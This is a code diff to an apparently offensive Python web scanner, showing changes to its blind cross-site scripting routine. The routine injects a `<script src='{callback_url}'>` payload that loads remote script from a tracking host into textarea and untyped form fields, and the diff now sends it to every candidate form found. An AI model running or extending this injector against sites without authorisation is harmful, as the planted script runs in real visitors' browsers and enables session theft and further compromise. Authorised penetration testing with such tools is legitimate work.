@@ -44,7 +44,7 @@ def prepare_Input_Data(candidate, load):
 
         text_types = ['text', 'password', 'email', 'search', 'number', 'textarea']
 
-        if cd.get('type') in text_types:
+        if cd.get('type', '') in text_types:
             data[input_name] = load
         else:
             data[input_name] = cd.get('value')
@@ -113,7 +113,23 @@ def check_blind_XSS(candidate):
     payload = f"<script src='{callback_url}'></script>"
     print(f"  [>] Injecting Blind XSS | Tracking ID: {tracking_id}")
     
-    data = prepare_Input_Data(candidate, payload)
+    data = {}
+    
+    for cd in candidate['inputs']:
+        input_name = cd.get('name')
+        if not input_name:
+            continue
+        input_type = cd.get('type', '')
+        
+        if input_type == 'submit':
+             data[input_name] = cd.get('value', '')
+        elif input_type in ['text', 'password', 'email', 'search', 'number']:
+            data[input_name] = 'Crucible'
+        elif input_type in ['textarea', None, '']:
+            data[input_name] = payload
+        else:
+            data[input_name] = cd.get('value', '')
+            
     send_Request(candidate['action'] , candidate['method'], data, session)
 
 def injector(forms, active_session):
@@ -141,7 +157,7 @@ def injector(forms, active_session):
 
         if exploitable:
             reflected_attacks = {executor.submit(check_Reflected_XSS, t): t for t in exploitable}
-            blind_attacks = {executor.submit(check_blind_XSS, t): t for t in exploitable}
+            
 
             for future in concurrent.futures.as_completed(reflected_attacks):
 
@@ -151,12 +167,13 @@ def injector(forms, active_session):
                         vulnerable_pages.extend(findings)
                 except Exception as e:
                     print(f"[-] Attack Thread Error: {e}")
-            
-            for future in concurrent.futures.as_completed(blind_attacks):
-                try:
-                    future.result()
-                except Exception as e:
-                    print(f"[-] Blind XSS Thread Error: {e}")
+                    
+        blind_attacks = {executor.submit(check_blind_XSS, t): t for t in candidates}
+        for future in concurrent.futures.as_completed(blind_attacks):
+            try:
+                future.result()
+            except Exception as e:
+                print(f"[-] Blind XSS Thread Error: {e}")
 
     return vulnerable_pages
 
